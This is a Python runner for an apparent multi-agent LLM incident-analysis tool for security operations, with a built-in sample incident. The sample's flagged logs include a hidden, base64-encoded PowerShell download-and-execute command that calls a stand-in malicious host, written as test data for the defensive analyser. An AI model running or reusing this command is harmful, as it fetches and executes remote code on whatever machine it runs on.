#!/usr/bin/env python3
"""
Agentic SOC — Multi-Agent LLM Incident Analysis Runner
Run full 3-Agent collaborative analysis on security incidents with flagged logs.
"""

import argparse
import json
import os
import sys
from datetime import datetime, timezone

from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Add workspace to path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from app.agents.multi_agent_pipeline import MultiAgentPipeline
from app.models.incident import FlaggedLog, Incident, IncidentReport


def create_sample_incident() -> Incident:
    """Generates a realistic multi-stage cyber attack incident with flagged logs."""
    return Incident(
        incident_id="INC-2026-9812",
        title="Suspicious Encoded PowerShell with Multi-Stage C2 Beaconing",
        severity="critical",
        rule_name="PowerShell.ObfuscatedPayload.ExternalSocket",
        timestamp=datetime.now(timezone.utc),
        description="Endpoint detection flagged encoded PowerShell spawned from Word, performing local discovery and initiating outbound TLS connections to untrusted domain.",
        flagged_logs=[
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:45:00+00:00"),
                event_type="process",
                host="FINANCE-DESKTOP-04",
                user="corp\\aditya",
                data={
                    "process_name": "WINWORD.EXE",
                    "process_id": 4120,
                    "command_line": '"C:\\Program Files\\Microsoft Office\\WINWORD.EXE" "C:\\Users\\aditya\\Downloads\\Invoice_Q3.docm"',
                },
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:45:08+00:00"),
                event_type="process",
                host="FINANCE-DESKTOP-04",
                user="corp\\aditya",
                data={
                    "process_name": "powershell.exe",
                    "process_id": 5820,
                    "parent_process_id": 4120,
                    "parent_process_name": "WINWORD.EXE",
                    "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBiAGUAYQBjAG8AbgAnACkA",
                },
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:45:18+00:00"),
                event_type="process",
                host="FINANCE-DESKTOP-04",
                user="corp\\aditya",
                data={
                    "process_name": "whoami.exe",
                    "process_id": 5910,
                    "parent_process_id": 5820,
                    "parent_process_name": "powershell.exe",
                    "command_line": "whoami /priv /groups",
                },
            ),
            FlaggedLog(
                timestamp=datetime.fromisoformat("2026-10-06T22:45:30+00:00"),
                event_type="network",
                host="FINANCE-DESKTOP-04",
                user="corp\\aditya",
                data={
                    "process_id": 5820,
                    "process_name": "powershell.exe",
                    "source_ip": "10.0.12.88",
                    "destination_ip": "198.51.100.23",
                    "destination_port": 443,
                    "protocol": "TCP",
                    "domain": "malicious.site",
                },
            ),
        ],
    )


def print_banner():
    print("\n" + "=" * 75)
    print(" 🛡️  AGENTIC SOC — MULTI-AGENT LLM INCIDENT ANALYSIS ENGINE")
    print("=" * 75)


def print_report(report: IncidentReport):
    # Color formatting
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

    verdict_color = RED if report.verdict == "MALICIOUS" else (YELLOW if report.verdict == "SUSPICIOUS" else GREEN)

    print(f"\n{BOLD}INCIDENT REPORT: {report.incident_id}{RESET}")
    print("-" * 75)
    print(f"{BOLD}Verdict:{RESET}      {verdict_color}{report.verdict}{RESET} (Confidence: {report.confidence * 100:.1f}%)")
    print(f"{BOLD}Severity:{RESET}     {RED if report.severity in ['CRITICAL', 'HIGH'] else YELLOW}{report.severity}{RESET}")
    print(f"{BOLD}Analyzed At:{RESET}  {report.analyzed_at.isoformat()}")

    print(f"\n{BOLD}📋 Executive Summary:{RESET}")
    print(f"  {report.executive_summary}")

    print(f"\n{BOLD}🎯 Root Cause & Initial Vector:{RESET}")
    print(f"  {report.root_cause}")

    print(f"\n{BOLD}⏱️  Reconstructed Attack Timeline:{RESET}")
    for idx, event in enumerate(report.attack_timeline, 1):
        print(f"  {CYAN}{idx}. [{event.timestamp.strftime('%H:%M:%S')}] ({event.event_type.upper()}){RESET} {event.summary}")

    print(f"\n{BOLD}🏷️  MITRE ATT&CK Mapping:{RESET}")
    for mitre in report.mitre_attack:
        print(f"  • {BLUE}[{mitre.technique_id}]{RESET} {mitre.name} {YELLOW}(Tactic: {mitre.tactic}){RESET}")

    print(f"\n{BOLD}🎯 Affected Entities & Indicators of Compromise (IOCs):{RESET}")
    print(f"  • Hosts:           {', '.join(report.affected_entities.hosts) or 'None'}")
    print(f"  • Users:           {', '.join(report.affected_entities.users) or 'None'}")
    print(f"  • Malicious PIDs:  {', '.join(map(str, report.affected_entities.suspicious_pids)) or 'None'}")
    print(f"  • Destination IPs: {', '.join(report.affected_entities.ioc_ips) or 'None'}")
    print(f"  • IOC Domains:     {', '.join(report.affected_entities.ioc_domains) or 'None'}")

    print(f"\n{BOLD}🚨 Tactical Remediation & Containment Checklist:{RESET}")
    for idx, action in enumerate(report.recommended_actions, 1):
        print(f"  [{idx}] {action}")

    print("\n" + "=" * 75 + "\n")

def main():
    parser = argparse.ArgumentParser(description="Run Multi-Agent LLM Incident Analysis")
    parser.add_argument("--file", "-f", help="Path to incident JSON file with flagged logs", type=str)
    parser.add_argument("--model", "-m", help="LLM Model to use (default: gemini-3.5-flash-lite)", default=os.getenv("AGENT_MODEL", "gemini-3.5-flash-lite"))
    args = parser.parse_args()

    print_banner()

    if args.file:
        if not os.path.exists(args.file):
            print(f"❌ Error: File not found: {args.file}")
            sys.exit(1)
        with open(args.file, "r") as f:
            data = json.load(f)
            incident = Incident(**data)
            print(f"📂 Loaded incident {incident.incident_id} from {args.file} with {len(incident.flagged_logs)} flagged log(s).")
    else:
        print("💡 No file provided; running multi-agent analysis on realistic sample attack scenario...")
        incident = create_sample_incident()

    # Check LLM key status
    has_gemini = bool(os.getenv("GEMINI_API_KEY"))
    has_openai = bool(os.getenv("OPENAI_API_KEY"))

    if has_gemini:
        print(f"🤖 Connected to Google Gemini ({args.model}) for live Multi-Agent LLM reasoning.")
    elif has_openai:
        print(f"🤖 Connected to OpenAI (GPT-4o) for live Multi-Agent LLM reasoning.")
    else:
        print("ℹ️  No API key found in GEMINI_API_KEY / OPENAI_API_KEY. Running in deterministic heuristic mode.")

    print("\n🚀 Executing 3-Agent Collaborative Pipeline:")
    print("   [1/3] 🕵️  Forensic Investigator Agent  --> Tracing execution & decoding commands...")
    print("   [2/3] 🎯 Threat & MITRE Analyst Agent  --> Mapping TTPs & adversary intent...")
    print("   [3/3] 🛡️  Incident Commander Agent       --> Formulating final verdict & containment plan...")

    pipeline = MultiAgentPipeline(model_name=args.model)
    report = pipeline.analyze(incident)

    print_report(report)

    dashboard_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "dashboard.html"))
    if os.path.exists(dashboard_path):
        print(f"🌐 View in Interactive Dashboard: file://{dashboard_path}")
        print("   (Or launch local web server: uvicorn app.main:app --reload -> http://localhost:8000/dashboard)\n")


if __name__ == "__main__":
    main()
